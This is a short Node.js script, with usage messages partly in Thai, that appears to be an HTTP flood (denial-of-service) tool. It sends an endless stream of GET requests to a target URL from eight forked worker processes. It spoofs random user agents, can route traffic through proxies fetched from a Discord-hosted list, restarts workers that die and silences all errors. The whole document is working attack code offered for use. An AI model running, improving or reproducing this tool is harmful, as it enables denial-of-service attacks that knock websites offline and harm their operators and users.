

const axios = require('axios')
const fakeUa = require('fake-useragent')
const cluster = require('cluster')
const HttpsProxyAgent = require('https-proxy-agent')
   
async function maintenance() {
  if (process.argv.length !== 4){
    console.log('การใช้งาน : node ax.js r/p')
    process.exit()
  }
  
  
  else{
    if (process.argv[3] == 'r'){
      console.log('Start Attack Raw')
    }
    else if(process.argv[3] == 'p'){
      const proxyscrape_http = await axios.get('https://cdn.discordapp.com/attachments/963407529835106336/963407605080916068/http_proxies.txt');
      var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
      console.log('Start Attack Proxy ')
    }
    else{
      console.log('r/p')
      process.exit()
    }
    function run(){
    if (process.argv[3] == 'r'){
      var config={
        url: process.argv[2],
        medthod:'get',
        headers:{
            'Cache-Control': 'no-cache',
            'User-Agent': fakeUa()
        }
      }
      axios(config).then(function (re){
        console.log("Attack Raw Error ",re.status)
      }).catch(function (error){
        console.log("Attack Raw Succeed ",error.response.status)
      })
    }
    else if (process.argv[3] == 'r'){
      var config={
        url: process.argv[2],
        medthod:'get',
        headers:{
            'Cache-Control': 'no-cache',
            'User-Agent': fakeUa()
        }
      }
      axios(config).then(function (re){
        console.log("Attack Raw Error ",re.status)
      }).catch(function (error){
        console.log("Attack Raw Succeed ",error.response.status)
      })
    }
    else if(process.argv[3] == 'p'){
      let proxy = proxies[Math.floor(Math.random() * proxies.length)];
      var agent = new HttpsProxyAgent('http://' + proxy);
      var cung={
        url:process.argv[2],
        httpsAgent: agent,
        medthod:'get',
        headers:{
           'Cache-Control': 'no-cache',
           'User-Agent': fakeUa()
          
        }
      }
      axios(cung).then(function (res){
        console.log("Attack Proxy Error",res.status)
      }).catch(function (error){
        console.log("Attack Proxy Succeed ",error.response.status)
      })
    }
    
  }
}

    

function time(){
  setInterval(()=>{
    run()
  })
}
async function th(){
  if (cluster.isMaster){
    for (let u=0;u<8;u++){
      cluster.fork()
      console.log('Attack Start')
    }
    cluster.on('exit',function(){
      cluster.fork()
    })
  }
  else{
    time()
  }
  
}
th()




}






process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
maintenance()
